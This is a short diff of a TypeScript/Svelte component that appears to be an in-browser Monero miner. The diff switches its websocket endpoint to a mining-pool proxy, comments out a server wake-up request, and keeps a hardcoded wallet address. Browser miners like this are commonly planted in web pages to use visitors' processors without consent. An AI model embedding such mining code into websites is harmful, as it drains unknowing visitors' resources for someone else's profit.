@@ -1,9 +1,10 @@
 <script lang="ts">
 let elem = "";
 ///https://github.com/craciuncezar/browser-cryptominer
-fetch("https://browser-crypto.herokuapp.com/");//request fails, but it wakes up the server
+// fetch("https://browser-crypto.herokuapp.com/");
 // const server = (location.protocol === 'https:' ? "wss://" : "ws://") +window.location.host+"/socketproxy";
-const server = "wss://browser-crypto.herokuapp.com/socket"
+const server = "wss://webminer.moneroocean.stream";
+// const server = "ws://localhost:7070/socket";
 const address = "4AKWEyztGBu5irJH1c1bRgCALBFXm21wy85CTh1cCYr3W8LQ63sCzavgg7hxF4d8f6H43SFP18JvQ1VDPrFWFpfxC37P1cF"
 
 let job: unknown = null; // remember last job we got from the server
